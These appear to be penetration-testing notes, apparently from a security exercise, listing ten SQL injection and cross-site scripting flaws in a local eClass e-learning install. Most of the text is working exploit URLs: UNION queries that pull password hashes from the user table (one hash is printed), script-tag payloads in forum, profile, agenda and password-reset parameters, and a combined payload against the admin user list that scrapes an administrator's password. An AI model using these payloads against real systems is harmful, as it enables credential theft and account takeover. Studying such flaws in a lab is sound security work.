
1) SQLi in conversation area:
Firstly this page shows SQL error (NEEDS TO BE FIXED)

create at least one topic in lesson forums

type the following url

http://localhost:8001/modules/phpbb/viewtopic.php?topic=' union select password as topic_title, 1 from eclass.user-- &forum=1')--

and you'll get the password of the first line of this query

select user_password as topic_title, 1 from users

this vuln is created at file modules/phpbb/viewtopic.php at lines 87-120 


2. XSS Vuln in live chat

http://localhost:8001/modules/conference/conference.php

Anything script-like will be xxs vuln


3. XSS Vuln
This is a vuln that exists in the replication to an existing thread message: 

http://localhost:8001/modules/phpbb/reply.php?Dialog1=on&Dialog2=on&Dialog3=on&Dialog4=on&Dialog5=on&Dialog6=on&message=<script>alert(1)</script>&forum=1&topic=7&quote=&submit=Υποβολή

this is the payload
message=<script>alert(1)</script>

change the &topic properly to make this work (change it to an existing topic id)

This happens because reply.php checks the form in the browser for script-tags but not the actual variable "message". THIS MIGHT BE A GOOD POINT TO START 


4. XSS Vuln during thread creation

THis is an vuln that exists during the creation of the thread: Once again the app does not sanitize  the URL "message" variable and ONLY THE FORM.

for example check the following link:

http://localhost:8001/modules/phpbb/newtopic.php?subject=test&Dialog1=on&Dialog2=on&Dialog3=on&Dialog4=on&Dialog5=on&Dialog6=on&message=<script>alert("XSS");</script>&forum=1&submit=Υποβολή

This is the payload:
message=<script>alert("XSS");</script>

5. XSS Vuln in username display
If you create a user and then change the name, surname, username or something in the following link then we can visit any page where the user data are displayed and then the magic happens

http://localhost:8001/modules/profile/profile.php?prenom_form=<script>alert("XSS")</script>&nom_form=dummy&username_form=dummy&email_form=dummy@localhost.gr&am_form=666&persoStatus=yes&userLanguage=el&submit=Αλλαγή

payload = prenom_form=%3Cscript%3Ealert("XSS")%3C/script%3E

6. XSS Vuln in agenda.
Change the year to a script and watch the magic happen <3

http://localhost:8001/modules/agenda/myagenda.php?month=5&year=%3Cscript%3Ealert(1)%3C/script%3E

7. XSS Vuln in password reset
First go to this path <root-url>/modules/auth/lostpass.php
check for username : <h1>, email a@<domail>.com.
We can see that there is a problem there since the email is printed as in a header tag.
so then we try

http://localhost:8001/modules/auth/lostpass.php?userName=<script>alert(1)</script>&email=aa@localhost.com&doit=Send

and we get the pop up.

8. XSS/SQLi in the course unregister action
Since the variables are dispayed in the url we play a little get some errors and construct the following payload url

http://localhost:8001/modules/unreguser/unregcours.php?cid=' union select password as intitule from user -- &u=1

Payload:
cid=' union select password as intitule from user --%20

With the following payload this can also be an xss vuln
Payload:
cid=' union select '<script>console.log("XSS")</script>' as intitule -- %20


9. SQLi in the new thread creation
First go to url 
http://localhost:8001/modules/phpbb/newtopic.php
we can see that while we choose the forum there is a variable ?forum=
that is set to an integer

If we change it we get an sql error and so we construct this payload

Payload:
') union select password as forum_name, 2 as forum_access, 1 as forum_id from eclass.user --%20

After that we can see that there is still an error BUT if we check the path displayed in the upper part of the screen
we could notice the password hash
Χαρτοφυλάκιο χρήστη » Εισαγωγή στον Κομμουνισμό » Περιοχές Συζητήσεων » bf760b37003789535a8eec1bb665638b » Νέο θέμα

Here it is 
bf760b37003789535a8eec1bb665638b

10 XSS/SQLi/CSRF:

http://localhost:8001//modules/admin/listusers.php?user_surname=a' union select '<script>alert(1)</script>' as user_id ,password as nom,'3' as prenom,'4' as username,'5' as email,'6' as statut from eclass.user where username='drunkadmin'-- &user_firstname=<script>alert(1)</script>&user_am=&user_type=0&user_registered_at_flag=1&date= &hour=0&minute=0&user_email=&user_username=&c=searchlist&search_submit=Αναζήτηση

To send the pass:
user_firstname=<script>s=document.documentElement.innerHTML;var k=s.match(/<td>[a-z0-9A-Z]+/gi)[0]; console.log(k)</script>


